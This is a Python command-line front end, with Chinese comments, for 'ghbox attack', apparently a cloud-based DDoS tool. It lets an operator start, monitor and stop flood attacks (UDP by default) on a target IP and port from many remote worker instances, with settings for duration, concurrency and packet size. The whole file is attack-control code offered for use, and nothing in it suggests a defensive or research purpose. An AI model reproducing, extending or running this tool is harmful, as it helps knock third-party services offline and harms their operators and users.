# -*- coding: utf-8 -*-
"""
ghbox 攻击客户端入口

用法：
  python3 -m cli.ghss_attack <EXEC_TOKEN> [MANAGER_URL] [create|monitor|stop|interactive] [参数]

命令模式：
  create --target 1.2.3.4 --type udp --duration 60 --workers inst2,inst5
  monitor [--workers ...]
  stop    [--workers ...]
  interactive
"""
import sys
import time
import argparse

from rich.panel import Panel

from cli.common import config
from cli.attack import ops
from cli.attack.ui import console


def _build_parser():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--target")
    parser.add_argument("--type", default="udp")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--concurrency", type=int, default=500)
    parser.add_argument("--packet-size", type=int, default=1400)
    parser.add_argument("--workers")
    parser.add_argument("--no-monitor", action="store_true")
    return parser


def cmd_create(args):
    """创建攻击"""
    if not args.target:
        console.print("[red]需要 --target[/red]")
        return
    workers = ops.filter_workers(ops.get_instances(), args.workers)
    if not workers:
        console.print("[red]没有匹配的实例[/red]")
        return
    params = {
        "token": config.TOKEN,
        "target": args.target,
        "type": args.type,
        "port": args.port,
        "duration": args.duration,
        "concurrency": args.concurrency,
        "packet_size": args.packet_size,
    }
    console.print(f"[cyan]启动攻击 → {args.target}:{args.port} ({args.type}) "
                  f"对 {len(workers)} 台机器[/cyan]")
    results = ops.start_attack(workers, params)
    ok = sum(1 for r in results.values() if r.get("ok"))
    console.print(f"[green]✅ {ok}/{len(workers)} 台启动成功[/green]")
    if ok and not args.no_monitor:
        console.print("[cyan]等待攻击就绪...[/cyan]")
        time.sleep(3)
        console.print("[cyan]进入实时监控（Ctrl+C 停止）[/cyan]")
        ops.monitor_attack(workers, args.duration)


def cmd_monitor(args):
    """监控当前所有攻击"""
    workers = ops.filter_workers(ops.get_instances(), args.workers)
    if not workers:
        console.print("[red]没有实例[/red]")
        return
    console.print("[cyan]监控中（显示各实例实时统计）[/cyan]")
    ops.monitor_attack(workers, args.duration or 3600)


def cmd_stop(args):
    """停止攻击"""
    workers = ops.filter_workers(ops.get_instances(), args.workers)
    if not workers:
        console.print("[red]没有实例[/red]")
        return
    console.print("[yellow]停止攻击...[/yellow]")
    results = ops.stop_attack(workers)
    ok = sum(1 for v in results.values() if v)
    console.print(f"[green]✅ 已停止 {ok}/{len(workers)} 台[/green]")


def cmd_interactive(args):
    """交互模式"""
    console.print(Panel("[bold red]G H B O X   A T T A C K[/bold red]\n"
                        "[cyan]云端多实例攻击控制台[/cyan]", border_style="red"))
    workers = ops.select_instances_interactive()
    if not workers:
        return
    params = ops.configure_attack_interactive()
    if not params:
        return
    console.print(f"[cyan]目标: {params['target']}:{params['port']} "
                  f"类型: {params['type']} 时长: {params['duration']}s "
                  f"机器: {len(workers)} 台[/cyan]")
    results = ops.start_attack(workers, params)
    ok = sum(1 for r in results.values() if r.get("ok"))
    console.print(f"[green]✅ {ok}/{len(workers)} 台启动[/green]")
    if ok:
        ops.monitor_attack(workers, params["duration"])


def main():
    # 提取 token
    if len(sys.argv) < 2:
        console.print("[red]用法: ghss-attack <EXEC_TOKEN> [MANAGER_URL] "
                      "[create|monitor|stop|interactive] [参数][/red]")
        sys.exit(1)
    if not config.TOKEN:
        config.TOKEN = __import__("os").environ.get("EXEC_TOKEN", "")
    if len(sys.argv) > 1 and not sys.argv[1].startswith(("http", "--")):
        config.set_token(sys.argv[1])
    if not config.TOKEN:
        console.print("[red]需要 EXEC_TOKEN[/red]")
        sys.exit(1)
    cmd_idx = 2
    if len(sys.argv) > 2 and sys.argv[2].startswith("http"):
        config.set_manager(sys.argv[2])
        cmd_idx = 3

    parser = _build_parser()
    cmd = sys.argv[cmd_idx] if len(sys.argv) > cmd_idx else "interactive"
    args = parser.parse_args(sys.argv[cmd_idx + 1:])
    args.duration = args.duration or 60

    if cmd == "create":
        cmd_create(args)
    elif cmd == "monitor":
        cmd_monitor(args)
    elif cmd == "stop":
        cmd_stop(args)
    else:
        cmd_interactive(args)


if __name__ == "__main__":
    main()